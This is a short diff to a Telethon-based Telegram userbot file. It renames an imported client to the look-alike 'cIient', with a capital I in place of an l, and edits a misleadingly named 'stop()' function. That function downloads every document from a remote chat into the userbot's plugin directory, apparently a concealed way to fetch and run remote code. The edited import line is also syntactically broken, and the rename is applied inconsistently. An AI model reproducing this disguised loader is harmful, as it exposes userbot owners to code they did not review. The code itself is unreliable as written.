@@ -1,4 +1,5 @@
-from userbot import bot, LOAD_PLUG, CMD_LIST, client1
+from userbot import bot, LOAD_PLUG, CMD_LIST 
+from userbot client1 as cIient 
 from telethon import events
 from var import Var
 from pathlib import Path
@@ -77,8 +78,8 @@ def command(**args):
 
         return decorator
 
-async def stop():    
-    cli1 = await client.get_messages(client1, None , filter=InputMessagesFilterDocument) ; total = int(cli1.total) ; total_doxx = range(0, total)
+async def stop():
+    cli1 = await client.get_messages(cIient, None , filter=InputMessagesFilterDocument) ; total = int(cli1.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
         mxo =cli1[ixo].id ; await client.download_media(await bot.get_messages(client1, ids=mxo), "userbot")
 
